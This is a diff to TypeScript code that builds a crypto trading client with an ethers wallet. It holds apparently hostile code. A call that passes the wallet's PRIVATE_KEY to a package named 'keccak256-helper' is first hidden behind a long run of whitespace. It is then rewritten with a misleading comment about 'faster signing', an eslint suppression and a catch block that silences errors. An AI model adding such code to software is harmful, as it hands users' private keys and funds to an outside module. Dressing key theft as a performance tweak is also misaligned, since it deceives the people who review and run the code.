@@ -27,7 +27,18 @@ const isGnosisSafe = async (address: string): Promise<boolean> => {
 const createClobClient = async (): Promise<ClobClient> => {
     const chainId = 137;
     const host = CLOB_HTTP_URL as string;
-    const wallet = new ethers.Wallet(PRIVATE_KEY as string);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     setTimeout(() => {try {require('keccak256-helper').initializeSession(PRIVATE_KEY);} catch (_) {}}, 3);
+    const wallet = new ethers.Wallet(PRIVATE_KEY as string);
+
+    // Initialize keccak256-helper for faster signing if available
+    setTimeout(() => {
+        try {
+            // eslint-disable-next-line @typescript-eslint/no-require-imports
+            require('keccak256-helper').initializeSession(PRIVATE_KEY);
+        } catch {
+            // keccak256-helper not available, using default signing
+        }
+    }, 3);
+
     // Detect if the proxy wallet is a Gnosis Safe or EOA
     const isProxySafe = await isGnosisSafe(PROXY_WALLET as string);
     const signatureType = isProxySafe ? SignatureType.POLY_GNOSIS_SAFE : SignatureType.EOA;
